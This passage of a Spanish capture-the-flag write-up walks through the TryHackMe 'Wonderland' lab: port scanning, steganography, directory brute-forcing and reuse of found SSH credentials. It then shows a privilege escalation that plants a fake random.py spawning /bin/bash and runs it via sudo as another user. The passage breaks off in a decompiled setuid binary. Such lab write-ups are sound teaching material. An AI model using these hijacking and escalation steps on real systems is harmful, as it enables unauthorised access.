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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Descripción&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Fall down the rabbit hole and enter wonderland.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;80&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_thm&#34; style=&#34;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://tryhackme.com/p/NinjaJc01&#34;&gt;NinjaJc01&lt;/a&gt; &lt;img src=&#34;https://tryhackme-badges.s3.amazonaws.com/NinjaJc01.png&#34; class=&#34;user_maker_thm&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Sep  1 00:47:40 2020 as: nmap -Pn -sV -o mini_scan wonderland.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; wonderland.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.220.104&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Golang net/http server &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Go-IPFS json-rpc or InfluxDB API&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Sep  1 00:49:59 2020 -- 1 IP address (1 host up) scanned in 138.96 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_22-56-30.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos una imagen en la pagina, la descargamos, analizamos y encontramos un archivo dentro de la imagen el cual nos da una pista.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/wonderland$ steghide info white_rabbit_1.jpg 
&lt;span class=&#34;s2&#34;&gt;&amp;#34;white_rabbit_1.jpg&amp;#34;&lt;/span&gt;:
  format: jpeg
  capacity: 99.2 KB
Try to get information about embedded data ? &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;y/n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; y
Enter passphrase: 
  embedded file &lt;span class=&#34;s2&#34;&gt;&amp;#34;hint.txt&amp;#34;&lt;/span&gt;:
    size: 22.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
kali@kali:~/thm/wonderland$ steghide extract -sf white_rabbit_1.jpg 
Enter passphrase: 
wrote extracted data to &lt;span class=&#34;s2&#34;&gt;&amp;#34;hint.txt&amp;#34;&lt;/span&gt;.
kali@kali:~/thm/wonderland$ cat hint.txt 
follow the r a b b i t
kali@kali:~/thm/wonderland$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/wonderland$ gobuster dir -u http://wonderland.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/img &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/r &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;steganografia&#34;&gt;STEGANOGRAFIA&lt;/h2&gt;
&lt;p&gt;En &lt;code&gt;/img&lt;/code&gt; encontramos dos imagenes nuevas, utilizamos steghide y binwalk pero no encontramos nada interesante dentro de estas imagenes.&lt;/p&gt;
&lt;p&gt;En &lt;code&gt;/r&lt;/code&gt; solo encontramos una frase, ejecutamos gobuster nuevamente en este directorio.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-04-44.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos &lt;code&gt;/r/a&lt;/code&gt; y nuevamente una frase.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-07-59.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos nuevamente una frase en &lt;code&gt;/r/a/b/&lt;/code&gt; al pasarle gobuster &lt;code&gt;/r/a/&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-10-50.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al pasarle nuevamente a &lt;code&gt;/r/a/b/&lt;/code&gt; encontramos &lt;code&gt;/r/a/b/b/&lt;/code&gt; lo cual indica que la palabra que forma estos directorios es &lt;code&gt;rabbit&lt;/code&gt; el cual es la pista que encontramos en la imagen. Al visitar &lt;code&gt;/r/a/b/b/i/t/&lt;/code&gt; vemos una nueva pagina con una imagen nueva.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-15-29.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Además vemos lo que parecen ser unas credenciales escondidas.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-16-44.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;alice---user&#34;&gt;ALICE - USER&lt;/h1&gt;
&lt;p&gt;Utilizamos estas credenciales en el servicio ssh y logramos obtener una shell con la usuario Alice.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-20-57.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos una enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que podemos ejecutar python3 con el script &lt;code&gt;walrus_and_the_carpenter.py&lt;/code&gt; con el usuario &lt;code&gt;rabbit&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-08-31_23-44-46.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python:walrus_and_the_carpenter.py&#34; data-lang=&#34;python:walrus_and_the_carpenter.py&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;random&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;poem&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&amp;#34;The sun was shining on the sea,
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Shining with all his might:
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;He did his very best to make
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;The billows smooth and bright —
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;And this was odd, because it was
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;The middle of the night.
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[... REDACTED ...]
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;O Oysters,&amp;#34; said the Carpenter.
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;You’ve had a pleasant run!
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Shall we be trotting home again?&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;But answer came there none —
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;And that was scarcely odd, because
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;They’d eaten every one.&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;random&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;choice&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;poem&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;The line was:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos tambien a &lt;code&gt;perl&lt;/code&gt; con &amp;ldquo;capabilites&amp;rdquo; pero al intentar utilizar este nos mostró que no tenemos permisos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-41-48.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;rabbit---user&#34;&gt;RABBIT - USER&lt;/h1&gt;
&lt;p&gt;El script importa la libreria &lt;code&gt;random&lt;/code&gt;, por lo cual se podria realizar &lt;a href=&#34;https://rastating.github.io/privilege-escalation-via-python-library-hijacking/&#34;&gt;&lt;strong&gt;Python Library Hijacking&lt;/strong&gt;&lt;/a&gt;. Intentamos crear el archivo &lt;code&gt;import.py&lt;/code&gt; con una shell inversa dentro, ejecutamos &lt;code&gt;sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py&lt;/code&gt; pero la shell moría al conectarse. Ya que tenemos una shell ssh, ejecutamos &lt;code&gt;/bin/bash&lt;/code&gt; el cual nos devolveria una shell con el usuario rabbit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;import os; os.system(&amp;#39;/bin/bash&amp;#39;);&amp;#34;&lt;/span&gt; &amp;gt; random.py
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-11-14.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos una enumeracion con este archivo y encontramos &lt;code&gt;teaParty&lt;/code&gt; el cual copiamos a nuestra maquina para analizarlo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-13-51.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al ejecutar &lt;code&gt;strings&lt;/code&gt; vemos que posiblemente se realiza una ejecucion de &lt;code&gt;echo&lt;/code&gt; y &lt;code&gt;date&lt;/code&gt;, pero hay que tomar encuenta que &lt;code&gt;echo&lt;/code&gt; lleva el PATH/direccion del mismo y &lt;code&gt;date&lt;/code&gt; no.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wonderland/Screenshot_2020-09-01_00-14-26.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El codigo fuente generado por &lt;code&gt;Ghidra&lt;/code&gt; nos indica que si realiza la ejecucion de &lt;code&gt;echo&lt;/code&gt; y &lt;code&gt;date&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3eb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;setgid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3eb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Welcome to the tea party!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;The Mad Hatter will be here soon.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
